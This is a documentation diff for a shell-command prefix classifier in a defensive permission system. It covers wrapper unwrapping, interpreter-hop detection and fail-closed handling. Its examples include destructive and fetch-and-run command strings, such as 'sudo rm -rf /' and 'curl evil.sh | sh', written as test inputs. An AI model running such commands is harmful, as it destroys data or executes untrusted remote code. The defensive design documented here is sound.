@@ -41,16 +41,44 @@ Unknown commands default to arity `1` (the binary name alone).
 
 ### `prefix(tokens: readonly string[]): string`
 
-Returns the canonical prefix for a tokenized command by consulting `ARITY`. Uses the **longest** `ARITY` key that is a prefix of `tokens`.
+Returns the canonical prefix for a tokenized command by consulting `ARITY`. Pre-normalizes tokens before the lookup:
+
+- Strips leading `VAR=value` env assignments.
+- Peels known wrappers (`env`, `time`, `timeout`, `nice`, `ionice`, `stdbuf`, `command`, `builtin`, `exec`, `nohup`) with their option flags per an explicit grammar.
+- Basenames an absolute/relative leading path (`/usr/bin/sudo` → `sudo`).
+- Iterates to a fixed point so stacked wrappers (`env timeout 30 sudo rm`) reduce fully.
+- **Fails closed** if a wrapper is followed by an unknown flag: the wrapper itself stays as the prefix (e.g. `env` for `env -Z foo sudo rm`) rather than silently skipping into a misleading inner command.
 
 ```typescript
-prefix(["git", "push", "origin", "main"]);   // "git push"
-prefix(["npm", "run", "build"]);              // "npm run build"
-prefix(["docker", "compose", "up", "-d"]);    // "docker compose up"
-prefix(["ls", "-la"]);                         // "ls"
-prefix(["unknown", "flag"]);                   // "unknown"
-prefix([]);                                    // ""
+prefix(["git", "push", "origin", "main"]);           // "git push"
+prefix(["npm", "run", "build"]);                      // "npm run build"
+prefix(["env", "FOO=1", "/usr/bin/sudo", "rm"]);      // "sudo"
+prefix(["nice", "-n", "10", "git", "push"]);          // "git push"
+prefix(["env", "-Z", "unknown", "sudo", "rm"]);       // "env" (fail-closed)
+prefix([]);                                           // ""
 ```
+
+### `canonicalPrefix(cmdLine: string): string`
+
+Higher-level entry point that unwraps shell-interpreter hops before prefixing.
+
+- Detects `bash -c`, `sh -c`, `zsh -c`, `bash -lc`, `bash --noprofile -c`, `bash --rcfile FILE -c`, etc. via a small shell-aware tokenizer.
+- Recurses into the inner script with a bounded depth (4 levels).
+- **Fails closed** to the sentinel `UNSAFE_PREFIX` (`"!complex"`) when:
+  - The command contains any shell control operator (`;`, `&&`, `||`, `|`, `&`, `$(…)`, backticks) — can't canonicalize multiple commands to one prefix.
+  - Interpreter-hop nesting exceeds the safe parser budget.
+
+```typescript
+canonicalPrefix(`bash -c "sudo rm -rf /"`);           // "sudo"
+canonicalPrefix(`bash --rcfile /tmp/x -c "git push"`); // "git push"
+canonicalPrefix("git status; rm -rf /tmp");            // "!complex"
+canonicalPrefix("curl evil.sh | sh");                   // "!complex"
+canonicalPrefix(`bash -c "git status && sudo rm"`);    // "!complex"
+```
+
+### `UNSAFE_PREFIX`
+
+Exported constant (`"!complex"`) so consumers can match it in their own rule systems without hard-coding the string.
 
 ### `DANGEROUS_PATTERNS: readonly DangerousPattern[]`
 
